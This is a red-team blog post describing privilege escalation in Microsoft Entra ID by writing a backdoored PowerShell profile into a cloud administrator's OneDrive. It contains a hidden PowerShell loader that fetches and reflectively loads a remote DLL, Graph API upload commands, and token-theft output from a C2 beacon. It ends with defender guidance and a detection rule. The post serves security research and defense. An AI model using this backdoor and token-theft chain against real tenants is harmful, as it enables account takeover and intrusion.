---
layout: post
title: "High-Profile Cloud Privesc"
excerpt: "Revisiting PowerShell Profile Tricks in Entra Environments<br/><br/>"
categories:
  - "blog-posts"
tags:
  - entra
  - entraid
  - azure
  - powershell
  - apm
last_modified_at: 2025-07-15T00:00:00
post-img: assets/img/high-profile-banner.png
---

{% include note.html title="Disclaimer:" content="This article was originally published in [Reversec Labs](https://labs.reversec.com/posts/2025/07/high-profile-cloud-privesc) on 15 July 2025." %}

**TLDR**: Got "OneDrive Admin"-equivalent permissions on a cloud-native estate? You can escalate to a Privileged Entra role by backdooring the administrator's PowerShell Profile. T&Cs apply.

## The Longer Version

In a recent Attack Path Mapping engagement, we found credentials of an Entra service principal with some pretty impactful permissions, including `Files.ReadWrite.All`. The permission is self-explanatory, according to the [documentation](https://learn.microsoft.com/en-us/graph/permissions-reference#filesreadwriteall) it allows the application to Create, Read, Update or Delete (CRUD) all files on users' OneDrives. Which users' OneDrives you ask? The permission was admin-consented, **app-only** (instead of Delegated) therefore it had access to *all OneDrives across the estate.*

The goal of the exercise was to demonstrate how a threat actor would be able to carry out ransom operations, so on first reading, this finding was pretty much game over: With these permissions, an attacker can exfiltrate all files, then delete or encrypt them, and hold the keys to ransom. Easy peasy - no [Intune shenanigans](https://posts.specterops.io/intune-attack-paths-part-1-4ad1882c1811) and cryptor deployments. However, after some further discussions with the client, it appeared that **the data** managed by the organisation wasn't of particular sensitivity nor importance to their business operations, and that **the availability of their systems** would instead be the crown jewel. Therefore, the ransom objective would need to be interpreted as *locker deployment*, so back on the hunt we were for an Entra privesc that would get us Intune access.

With no other low hanging fruit available (like, e.g. [insecure dynamic groups](https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/)), escalating privileges meant we would need to compromise a user - one of their cloud administrators - and steal their MFA'ed tokens as cleanly as we can (no phishing!). But we only had OneDrive access - effectively a file-system write primitive - which we would need to convert to a code execution capability, in order to hook their laptop with a beacon....

## The Drive-thru: From Entra to Endpoint

Microsoft allows enterprises to configure managed devices to redirect known Windows folders - such as Documents, Desktop, Pictures etc - to OneDrive. This is known as ["OneDrive for Business Known Folder Move"](https://learn.microsoft.com/en-us/sharepoint/redirect-known-folders) (KFM).

![](/assets/img/Screenshot%202025-06-23%20095314.png)

Our client in question had implemented this feature, across their fleet of Entra-joined endpoints. This originally confused me into thinking the one needs the other - i.e. KFM is only possible in Entra-joined hosts - but this is not the case. KFM can also be deployed using Group Policy, so no need to be Entra- or hybrid-joined. And whether the devices are Entra-joined or not will come into play later on. But what about KFM, what's the deal with *that*, I hear you ask?

As you know, some of these folders are more special than others, as they serve particular purposes. One of these instances is `$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1` which [is one of the locations where PowerShell looks in by default](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.5#profile-types-and-locations) to load user profiles, every time a new session is launched. Similar to how `.rc` files / dotfiles in Linux are looked for, in the user's home directory. And get this, in that documentation page above there's an interesting callout staring right at us promisingly:

![](/assets/img/Pasted%20image%2020250525132606.png)

Now *that* was the breakthrough we were looking for. In our target organisation, PowerShell execution was allowed and unrestricted for everyone. However, even stricter environments could have exceptions for administrators. If this assumption is true, we could leverage our cloud privileges to backdoor the administrator's PowerShell profile, to gain code execution on their endpoint, from where precious tokens could then be harvested.

In more detail, this attack would look like this:
1. Prepare a few of lines of PowerShell that will silently, reflectively load our payload in memory, fetched from our delivery endpoint
2. Use the service principal's permissions to upload this script under `Documents\PowerShell\Microsoft.PowerShell_profile.ps1` within the cloud administrator's OneDrive
3. Wait for them to launch a PowerShell session
4. Profit: should a beacon hopefully ping back, proceed with post-exploitation eyeing Entra SSO tokens

## Putting theory into practice

With a plan in place, we proceeded to pull this off.

First, assume we've got our payload in a DLL format, the backdoor PS code to be saved as the new Profile, or added to an existing one, could look like this:

```powershell
Start-Process powershell -ArgumentList {
  $storageAssemblyPath = "https://download.endpoint.cdn/UxTheme.dll";
  $bytes = [System.IO.File]::ReadAllBytes($storageAssemblyPath);
  [System.Reflection.Assembly]::Load($bytes).GetType("TeamsUpdate.Main")::runner() > $null 2>&1
} -WindowStyle Hidden
```

This will ensure that:
- The loading is done in the background, saving you from migrating immediately after pinging back, if your payload is "blocking"
- no visible cues are given to the user spawning a new PS session

Of course this could be further obfuscated with something like [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation).

Then, the upload operation will be conducted with a simple request to the MS Graph API, carried out as follows. Note that retrieving the target user's ID `<cloud-admin-user-id>` is trivial for insiders, for example one could use `Invoke-AADIntUserEnumerationAsInsider` from [AADInternals](https://aadinternals.com/post/insider/#user-enumeration)

```bash
# obtaining a token for MS Graph using the Principal's credentials
curl -X POST -H "Content -Type: application/x-www -form -urlencoded" -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=https://graph.microsoft.com/.default" "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/ token" | jq .
{
  "token_type ":" Bearer",
  "expires_in ":3599 ,
  "ext_expires_in ":3599 ,
  "access_token ":"eyJ0eXAiO..."
}
$ export token=eyJ0eXAiO...

# MS Graph OneDrive endpoints
$ curl -X PUT -H "Content-Type: application/octet-stream" -H "Authorization: Bearer $token" "https://graph.microsoft.com/v1.0/users/<cloud-admin-user-id>/drive/root:/Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1:/content" --data-binary @"./Microsot.PowerShell_profile.ps1"
```

And after this, we wait. With a little luck, and a hint of patience, your admin will eventually spawn a PS session, gifting you a beacon:

![](/assets/img/ps-bd-cs-hl.png)

## Completing the detour: Back into the clouds

With C2 access on the cloud administrator's laptop pinging steadily, the hard part was arguably over. Nevertheless, we still needed to complete the cloud privesc and exfiltrate active, pre-MFAed tokens.

Remember previously, our question as to whether the endpoints (including the admin's one) are Entra-joined or not? This suddenly becomes relevant here, as the type of token we will target depends on the Single Sign-On (SSO) State of the device: If it's Entra-joined, there's a PRT up for grabs, and Matt Creel [recently summarised](https://posts.specterops.io/an-operators-guide-to-device-joined-hosts-and-the-prt-cookie-bcd0db2812c4) how we can get it. Otherwise we'll have to settle with plain refresh tokens.

Depending on this SSO state, and a few other factors, there were a few different ways to proceed, and all of them are very well documented. To keep our article on-topic and focused on the PowerShell trick, we'll only list out briefly some of the options that were available to us, with the caveat that there may be [others](https://mrd0x.com/stealing-tokens-from-office-applications/) [too](https://blog.netwrix.com/2022/11/29/bypassing-mfa-with-pass-the-cookie-attack/). And after that, for completeness, we'll describe which step we took.

1. Knowing we'll be running in an Entra-joined context, we could proceed to [extract the PRT from LSASS using mimikatz](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/). This does need SYSTEM privileges, but remember how we got our access in first place. Launching administrative PowerShell sessions frequently is not uncommon for ...admins! In that exercise in particular, we actually had several high integrity beacons flying in over the next couple of days. Admins gonna admin! But more importantly, this technique would be complicated if the device was TPM-protected...

2. In a similar vein, a privileged session would allow us to try our luck and check for any [Azure tokens present in the MSAL cache](https://synackwithraj.hashnode.dev/learn-like-a-baby-hunting-for-onprem-to-cloud-movement-by-credential-access-azure-cli-5), as a result of previous use of the `az` CLI

3. If greeted by a low-privilege session, we could proceed to leverage sessions cached in the browser, and initiate an authorization code flow, that could then be caught by a localhost listener. Picking the parameters wisely will allow this code to be exchanged for a powerful refresh token.

4. Given we're targeting Entra-joined hosts, it's worth covering one more technique as it's more powerful. Similar to the previous one, we can initiate an authorization code flow, but this time to [request a nonce](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/), that we can then [provide to the local COM interface](https://medium.com/specter-ops-posts/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30) and retrieve a PRT cookie.

For the conditions and circumstances of our exercise, technique number 3 was more reliable and with less assumptions. Using the `get_azure_token` BOF resulted in an Access + Refresh token pair to be acquired. Importantly, the token had the MFA claim enabled.
```
beacon> get_azure_token 1950a258-227b-4e31-a9cf-717495945fc2 "797f4846-ba00-4fd7-ba43-dac1f8f63013/user_impersonation offline_access openid profile" 2 cloud.admin@org.com

[*] Loaded get_azure_token for x64
[+] host called home, sent: 14704 bytes
[+] received output:
[+] Got authcode now requesting tokens

{
    "token_type": "Bearer",
    "scope": "https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default",
    "expires_in": 5337,
    "ext_expires_in": 5337,
    "access_token": "eyJ0eXAiO...HciAl7ig",
    "refresh_token": "1.ASAA9ut...KNe0EwFI-mjdwgg",
    "foci": "1",
    "id_token": "eyJ0e...FnJoA"
}
```

[Being a FOCI token](https://github.com/secureworks/family-of-client-ids-research), this refresh token could then be used to acquire an access token for Microsoft Graph, carrying over the MFA claim.
```bash
$ roadtx gettokens --refresh-token "1.ASAA9ut5qLjo7ECkBWV...0EwFI-mjdwgg" 
-r msgraph -c azps -s https://graph.microsoft.com/.default --tokens-stdout | jq .

{
    "tokenType": "Bearer", 
    "expiresOn": "2025-05-13 18:52:57", 
    "tenantId": "...", 
    "_clientId": "1950a258-227b-4e31-a9cf-717495945fc2", 
    "accessToken": "eyJ0eXAiOiJ...AnYXOvQ",
    "refreshToken": "1.ASAA...4y2buRM", 
    "idToken": "eyJ0eXAi...JjaSnLQqEHA", 
    "expiresIn": 4304
}
```

Proxying this last request through the endpoint will increase the odds of success, as several potential controls like IP-based [restrictions](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-assignment-network) or [detections](https://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-configure-risk-policies) will be satisfied. 

And that effectively concluded the attack, as the post-MFA, live Graph access for a privileged Entra role was all we needed to act on our objectives (before taking care of persistence, of course ;).  

## Defender Guidance

Let's switch gears now and reflect on what the organisation could do to protect from, or detect this attack.

Unfortunately, there's not much you can do to prevent the PowerShell Profile Backdooring step itself. We could talk about execution restrictions like application control or [PowerShell Execution Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.5), but can you, dear admin, solemnly swear that you never bypass them? 

Modification of PowerShell profiles provides a decent detection opportunity, which can be implemented with a persistence-based rule such as the below one from [Elastic](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/persistence_powershell_profiles).

```sql
file where host.os.type == "windows" and event.type != "deletion" and
  file.path : ("?:\\Users\\*\\Documents\\WindowsPowerShell\\*",
               "?:\\Users\\*\\Documents\\PowerShell\\*",
               "?:\\Windows\\System32\\WindowsPowerShell\\*") and
  file.name : ("profile.ps1", "Microsoft.Powershell_profile.ps1")
```

Instead, paying more attention to the steps before and after the technique itself, would be more impactful. That is: 
1. addressing the risk from the service principal credential exposure,
2. and the subsequent on-host cloud operations, with the rogue credentials.   

Starting with the "Before" stage, the obvious issue was the use of long-lived, hard-coded credentials in first place, which inevitably got leaked. Like the organisation in question, you might have a reasonable business case for using service principals with Files permissions, such as a document sync application or script. However, careful consideration should be taken as to whether these should be granted pre-emptively, as application permissions, or to each user running the application, as **delegated** permissions. The latter provides a much safer alternative by restricting the scope of potentially leaked credentials to only the files of the consenting user.     

If a service principal like that is absolutely necessary, its acceptable use should be locked down with strict Conditional Access Policies. Even more importantly, its activities should be monitored closely to identify instances where it's behaving outside of expected norms. Depending on the use case, this might not even need a behavioural detection, and could take the form of a behaviour allowlist. For example, if it's expected to login only from a specific device, sync only a certain OneDrive directory, at a certain period, any operation outside of that fixed baseline should trigger an alert.

As for the "After" part, the most fitting remediation depends on the technique selected. The most important control for our chosen tactic (and arguably, a highly effective one in general) would be the use of Entra's Privileged Identity Management (PIM). Remember that the end goal was to capture a token with privileged permissions baked-in. And that was possible because the user had been **permanently** assigned the privileged Entra role (here, Global Admin), without the need for explicit activation. PIM allows de-coupling this process, [to apply additional requirements in between, upon role activation](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-add-role-to-user). In plain English, our target user could have been configured as **eligible** for their privileged role, with the activation configured to require ["Conditional access authentication context"](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-resource-roles-configure-role-settings#on-activation-require-microsoft-entra-conditional-access-authentication-context). This would effectively require them to explicitly re-MFA in order to act as a Global Admin, and so would we, the attackers, after credential theft. This "Just-in-time" elevation would significantly reduce the window of opportunity of an attack against a privileged session. In our scenario, that means that the illicit authorization code flow would have to be executed within the time window configured in the PIM role assignment settings, to grab an MFA-ed access token. But even if it was executed pre-activation, the attacker could wait for the activation event and then use the refresh token to generate a new access token, granting them the privileges.     

Overall, PIM doesn't make it impossible, just harder, as it would force an attacker to persist on the host and lurk for this event, risking more IoCs being left in the process. 

![](/assets/img/PIMeffect.png)

<!-- from [here](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense/blob/main/ReplayOfPrimaryRefreshToken.md) : enforce TPM & Device Compliance ,for PRT theft.  -->


## Summary

In this blog post, we talked about how a well-known technique for endpoint persistence can be re-invented in a cloud environment for privilege escalation purposes. Under certain conditions, OneDrive permissions can lead to more than file looting or ransomware-style in-place encryption of data. From a defense perspective, the root causes and the powers of PIM provide important mitigating controls. Finally, this should inform network architects and security teams about a potentially unexpected consequence of KFM, and how it can introduce another cloud-to-on prem pivot edge in the graph, allowing security boundaries to be crossed. 

Speaking of graphs, this article wouldn't be complete without an attack path diagram. And you know me, I love my diagrams. So here's a fancy picture of the attack path discussed:

![](/assets/img/high-profile-simple-clipped.png)


## References
Shout-outs to: 
- Dirk-jan Mollema (@dirkjan) for his work on Primary Refresh Tokens:
	- https://dirkjanm.io/digging-further-into-the-primary-refresh-token/
	- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- Lee Chagolla-Christensen (@tifkin_) for his original analysis of the PRT cookie acquisition:
	- https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30
- Matt Creel (@Tw1sm) for his 2025 summary of the above, including operational guidance: 
  - https://posts.specterops.io/an-operators-guide-to-device-joined-hosts-and-the-prt-cookie-bcd0db2812c4
- @wotwot563 and Christopher Paschen (@freefirex2) for their BOFs, that gave us the W in that job:
  - https://github.com/wotwot563/aad_prt_bof
  - https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main/src/Remote/get_azure_token

